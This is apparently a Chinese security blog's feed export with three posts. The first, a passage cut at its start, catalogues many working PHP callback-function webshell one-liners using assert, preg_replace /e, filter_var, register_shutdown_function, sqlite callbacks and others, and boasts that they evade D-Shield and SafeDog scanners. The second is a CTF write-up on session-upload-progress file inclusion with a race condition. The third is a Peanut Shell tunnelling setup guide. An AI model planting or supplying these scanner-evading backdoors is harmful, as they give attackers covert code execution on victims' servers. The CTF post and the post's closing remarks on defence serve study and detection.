<p>依旧被D盾查杀。</p>
<p>果然，简单的数组回调后门，还是很容易被发现与查杀的。</p>
<h2 id="php5-4-8-中的assert"><a href="#php5-4-8-中的assert" class="headerlink" title="php5.4.8+中的assert"></a>php5.4.8+中的assert</h2><p>php 5.4.8+后的版本，assert函数由一个参数，增加了一个可选参数descrition：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/73dc1437155703.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-73dc1437155703.png" alt="QQ20150718-7@2x.png"></a></p>
<p>这就增加（改变）了一个很好的“执行代码”的方法assert，这个函数可以有一个参数，也可以有两个参数。那么以前回调后门中有两个参数的回调函数，现在就可以使用了。</p>
<p>比如如下回调后门：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">uasort(<span class="variable">$arr</span>, base64_decode(<span class="variable">$e</span>));</span><br></pre></td></tr></table></figure>
<p>这个后门在php5.3时会报错，提示assert只能有一个参数：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/d1791437156028.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-d1791437156028.png" alt="QQ20150718-8@2x.png"></a></p>
<p>php版本改作5.4后就可以执行了：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/503c1437156036.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-503c1437156036.png" alt="QQ20150718-9@2x.png"></a></p>
<p>这个后门，狗和盾是都查不出来的：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/443c1437156131.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-443c1437156131.png" alt="QQ20150718-6@2x.png"></a></p>
<p>同样的道理，这个也是功能类似：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>);</span><br><span class="line">uksort(<span class="variable">$arr</span>, <span class="variable">$e</span>);</span><br></pre></td></tr></table></figure>
<p>再给出这两个函数，面向对象的方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// way 0</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$arr</span>-&gt;uasort(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// way 1</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>));</span><br><span class="line"><span class="variable">$arr</span>-&gt;uksort(<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>再来两个类似的回调后门：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_reduce(<span class="variable">$arr</span>, <span class="variable">$e</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="variable">$arr2</span> = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_udiff(<span class="variable">$arr</span>, <span class="variable">$arr2</span>, <span class="variable">$e</span>);</span><br></pre></td></tr></table></figure>
<p>以上几个都是可以直接菜刀连接的一句话，但目标PHP版本在5.4.8及以上才可用。</p>
<p>我把上面几个类型归为：二参数回调函数（也就是回调函数的格式是需要两个参数的）</p>
<h2 id="三参数回调函数"><a href="#三参数回调函数" class="headerlink" title="三参数回调函数"></a>三参数回调函数</h2><p>有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数。比如array_walk。</p>
<p>array_walk的第二个参数是callable类型，正常情况下它是格式是两个参数的，但在0x03中说了，两个参数的回调后门需要使用php5.4.8后的assert，在5.3就不好用了。但这个回调其实也可以接受三个参数，那就好办了：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/9be31437157461.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-9be31437157461.png" alt="QQ20150718-11@2x.png"></a></p>
<p>php中，可以执行代码的函数：</p>
<ol>
<li>一个参数：assert</li>
<li>两个参数：assert （php5.4.8+）</li>
<li>三个参数：preg_replace /e模式</li>
</ol>
<p>三个参数可以用preg_replace。所以我这里构造了一个array_walk + preg_replace的回调后门：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk(<span class="variable">$arr</span>, <span class="variable">$e</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>如图，这个后门可以在5.3下使用：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/fa4a1437157665.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-fa4a1437157665.png" alt="QQ20150718-12@2x.png"></a></p>
<p>但强大的D盾还是有警觉（虽然只是等级2）：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/c4a41437157785.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-c4a41437157785.png" alt="QQ20150718-13@2x.png"></a></p>
<p>不过呵呵，PHP拥有那么多灵活的函数，稍微改个函数（array_walk_recursive）D盾就查不出来了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk_recursive(<span class="variable">$arr</span>, <span class="variable">$e</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>不截图了。</p>
<p>看了以上几个回调后门，发现preg_replace确实好用。但显然很多WAF和顿顿狗狗的早就盯上这个函数了。其实php里不止这个函数可以执行eval的功能，还有几个类似的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace(<span class="string">&#x27;.*&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>另一个：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_filter(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>这两个一句话都是不杀的：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/98fa1437158638.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-98fa1437158638.png" alt="QQ20150718-14@2x.png"></a></p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/8c131437158645.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-8c131437158645.png" alt="QQ20150718-15@2x.png"></a></p>
<p>好用的一句话，且用且珍惜呀。</p>
<h2 id="无回显回调后门"><a href="#无回显回调后门" class="headerlink" title="无回显回调后门"></a>无回显回调后门</h2><p>回调后门里，有个特殊的例子：ob_start。</p>
<p>ob_start可以传入一个参数，也就是当缓冲流输出时调用的函数。但由于某些特殊原因（可能与输出流有关），即使有执行结果也不在流里，最后也输出不了，所以这样的一句话没法用菜刀连接：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure>
<p>但如果执行一个url请求，用神器cloudeye还是能够观测到结果的：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/54a81437160925.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-54a81437160925.png" alt="QQ20150718-17@2x.png"></a></p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/b21a1437160923.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-b21a1437160923.png" alt="QQ20150718-16@2x.png"></a></p>
<p>即使没输出，实际代码是执行了的。也算作回调后门的一种。</p>
<h2 id="单参数后门终极奥义"><a href="#单参数后门终极奥义" class="headerlink" title="单参数后门终极奥义"></a>单参数后门终极奥义</h2><p>preg_replace、三参数后门虽然好用，但/e模式php5.5以后就废弃了，不知道哪天就会给删了。所以我觉得还是单参数后门，在各个版本都比较好驾驭。</p>
<p>这里给出几个好用不杀的回调后门</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">register_shutdown_function(<span class="variable">$e</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>这个是php全版本支持的，且不报不杀稳定执行：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/efb21437200234.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-efb21437200234.png" alt="QQ20150718-19@2x.png"></a></p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/4aec1437200232.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-4aec1437200232.png" alt="QQ20150718-18@2x.png"></a></p>
<p>再来一个：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function (<span class="variable">$e</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>再来两个：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br></pre></td></tr></table></figure>
<p>这两个是filter_var的利用，php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。</p>
<p>这几个单参数回调后门非常隐蔽，基本没特征，用起来很6.</p>
<h2 id="数据库操作与第三方库中的回调后门"><a href="#数据库操作与第三方库中的回调后门" class="headerlink" title="数据库操作与第三方库中的回调后门"></a>数据库操作与第三方库中的回调后门</h2><p>回到最早微博上发出来的那个sqlite回调后门，其实sqlite可以构造的回调后门不止上述一个。</p>
<p>我们可以注册一个sqlite函数，使之与assert功能相同。当执行这个sql语句的时候，就等于执行了assert。所以这个后门我这样构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:sqlite.db3&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;sqliteCreateFunction(<span class="string">&#x27;myfunc&#x27;</span>, <span class="variable">$e</span>, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$sth</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT myfunc(:exec)&quot;</span>);</span><br><span class="line"><span class="variable">$sth</span>-&gt;execute(<span class="keyword">array</span>(<span class="string">&#x27;:exec&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<p>执行之：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201507/02e21437200976.png"><img src="https://www.leavesongs.com/content/uploadfile/201507/thum-02e21437200976.png" alt="QQ20150718-20@2x.png"></a></p>
<p>上面的sqlite方法是依靠PDO执行的，我们也可以直接调用sqlite3的方法构造回调后门：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;sqlite.db3&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;createFunction(<span class="string">&#x27;myfunc&#x27;</span>, <span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT myfunc(?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;bindValue(<span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], SQLITE3_TEXT);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;execute();</span><br></pre></td></tr></table></figure>
<p>前提是php5.3以上。如果是php5.3以下的，使用sqlite_*函数，自己研究我不列出了。</p>
<p>这两个回调后门，都是依靠php扩展库（pdo和sqlite3）来实现的。其实如果目标环境中有特定扩展库的情况下，也可以来构造回调后门。</p>
<p>比如php_yaml：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = urlencode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="variable">$yaml</span> = &lt;&lt;&lt;EOD</span><br><span class="line">greeting: !&#123;<span class="variable">$str</span>&#125; <span class="string">&quot;|.+|e&quot;</span></span><br><span class="line">EOD;</span><br><span class="line"><span class="variable">$parsed</span> = yaml_parse(<span class="variable">$yaml</span>, <span class="number">0</span>, <span class="variable">$cnt</span>, <span class="keyword">array</span>(<span class="string">&quot;!<span class="subst">&#123;$_REQUEST[&#x27;pass&#x27;]&#125;</span>&quot;</span> =&gt; <span class="string">&#x27;preg_replace&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>还有php_memcached：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mem</span> = <span class="keyword">new</span> Memcache();</span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$mem</span>-&gt;addServer(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">11211</span>, <span class="literal">TRUE</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="literal">TRUE</span>, create_function(<span class="string">&#x27;$a,$b,$c,$d,$e&#x27;</span>, <span class="string">&#x27;return assert($a);&#x27;</span>));</span><br><span class="line"><span class="variable">$mem</span>-&gt;connect(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="number">11211</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>自行研究吧。</p>
<h2 id="其他参数型回调后门"><a href="#其他参数型回调后门" class="headerlink" title="其他参数型回调后门"></a>其他参数型回调后门</h2><p>上面说了，回调函数格式为1、2、3参数的时候，可以利用assert、assert、preg_replace来执行代码。但如果回调函数的格式是其他参数数目，或者参数类型不是简单字符串，怎么办？</p>
<p>举个例子，php5.5以后建议用preg_replace_callback代替preg_replace的/e模式来处理正则执行替换，那么其实preg_replace_callback也是可以构造回调后门的。</p>
<p>preg_replace_callback的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为assert，就会执行不了，因为assert接受的参数是字符串。</p>
<p>所以我们需要去“构造”一个满足条件的回调函数。</p>
<p>怎么构造？使用create_function：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace_callback(<span class="string">&#x27;/.+/i&#x27;</span>, create_function(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>“创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。</p>
<p>这也是一个不杀不报稳定执行的回调后门，但因为有create_function这个敏感函数，所以看起来总是不太爽。不过也是没办法的事。</p>
<p>类似的，这个也同样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace_callback(<span class="string">&#x27;.+&#x27;</span>, create_function(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>再来一个利用CallbackFilterIterator方法的回调后门：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">CallbackFilterIterator</span>(<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>],)), create_function(<span class="string">&#x27;$a&#x27;</span>, <span class="string">&#x27;assert($a);&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$iterator</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$item</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里也是借用了create_function来创建回调函数。但有些同学就问了，这里创建的回调函数只有一个参数呀？实际上这里如果传入assert，是会报错的，具体原因自己分析。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这一篇文章，就像一枚核武器，爆出了太多无特征的一句话后门。我知道相关厂商在看了文章以后，会有一些小动作。不过我既然敢写出来，那么我就敢保证这些方法是多么难以防御。</p>
<p>实际上，回调后门是灵活且无穷无尽的后门，只要php还在发展，那么就有很多很多拥有回调函数的后门被创造。想要防御这样的后门，光光去指哪防哪肯定是不够的。</p>
<p>简单想一下，只有我们去控制住assert、preg_replace这类函数，才有可能防住这种漏洞。</p>
]]></content>
      <categories>
        <category>share</category>
      </categories>
  </entry>
  <entry>
    <title>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</title>
    <url>/2020/10/10/%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</p>
<a id="more"></a>

<p><img src="http://img.npfs06.top/20210226195757.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们可以利用<code>session.upload_progress</code>将木马写入session文件，然后包含这个session文件。不过前提是我们需要创建一个session文件，并且知道session文件的存放位置。</p>
<p>session里有一个默认选项，<strong>session.use_strict_mode</strong>默认值为off。</p>
<p><img src="http://img.npfs06.top/20210226195810.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值.</p>
<p>注：在Linux系统中，session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</p>
<p>但是<strong>session.upload_progress.cleanup</strong>默认是开启的</p>
<p><img src="http://img.npfs06.top/20210226195829.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>框着的这句话意思就是说<strong>在默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，它就会清除进度信息</strong></p>
<p>这里我们可以利用条件竞争来进行文件上传</p>
<p>下面讲个例题来实践一下：</p>
<p>CTFshow 里web入门里的一个文件包含题</p>
<p><img src="http://img.npfs06.top/20210226195841.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>通过观察代码，可以看到过滤了大部分的文件包含函数，这里我们利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</p>
<p>以POST的形式发包，传的文件随意</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://e113b1bc-28b8-4f08-9e60-b74fe3a96ef3.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>抓包，这里我们添加一个 Cookie :PHPSESSID=flag   ，PHP将会在服务器上创建一个文件：/tmp/sess_flag” （这里我们猜测session文件默认存储位置为/tmp），并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马，修改如下</p>
<p><img src="http://img.npfs06.top/20210226195857.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag</p>
<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>
<p><img src="http://img.npfs06.top/20210226195917.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>条件竞争，将POST和GET的包都开启爆破，即可得到目录，</p>
<p><img src="http://img.npfs06.top/20210226195933.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以看到有fl0g.php，只要把ls改为 cat fl0g.php即可，修改如下：</p>
<p><img src="http://img.npfs06.top/20210226195952.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>爆破即可得到flag</p>
<p><img src="http://img.npfs06.top/20210226200007.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>利用花生壳内网穿透</title>
    <url>/2021/10/22/%E5%88%A9%E7%94%A8%E8%8A%B1%E7%94%9F%E5%A3%B3%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<p>利用花生壳内网穿透<a id="more"></a></p>
<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a><strong>环境准备</strong></h1><p>kali、linux版花生壳、有RCE的靶机</p>
<h1 id="花生壳官网下载安装包"><a href="#花生壳官网下载安装包" class="headerlink" title="花生壳官网下载安装包"></a>花生壳官网下载安装包</h1><p>花生壳的<a href="https://hsk.oray.com/download/">官网</a></p>
<p>（1）在kali中先创建好一个目录，下载花生壳linux文件，输入命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wget https://down.oray.com/hsk/linux/phddns_5_1_amd64.deb</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211022143627.png" style="zoom:80%;">



<p>（2）安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i phddns_5_1_amd64.deb</span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20211022143754.png" style="zoom:80%;">

<p>启动花生壳</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">phddns <span class="literal">start</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211022143928.png" style="zoom:80%;">



<p>安装成功，根据下面的提示有个远程管理地址，访问一下，账号就是上面的SN和password</p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>在花生壳官网进行设置内网穿透。</p>
<p>火狐浏览器打开：<a href="http://b.oray.cm/">http://b.oray.cm</a></p>
<p>使用用户名：SN内容</p>
<p>密码:admin</p>
<p>登陆后，申请 一个免费的壳域名。</p>
<img src="http://img.npfs06.top/20211022144007.png" style="zoom:80%;">



<p>登入后需要注册账号，扫码激活，绑定设备</p>
<img src="http://img.npfs06.top/20211022144828.png" style="zoom:80%;">







<img src="http://img.npfs06.top/20211022153756.png" style="zoom:80%;">

<p>只能免费使用tcp udp</p>
<p>http服务需要购买，买一年送98年</p>
<p>接下来配置映射，选择HTTP，外网域名会自动给你填上，选择动态端口，内网主机就是你的IP地址，内网端口按自己需求填写，点击保存</p>
<img src="http://img.npfs06.top/20211022153454.png" style="zoom:80%;">



<p>然后在外网访问<a href="http://447o2u9855.qicp.vip:51463/">http://447o2u9855.qicp.vip:51463</a> （随机端口）即可</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
  </entry>
  <entry>
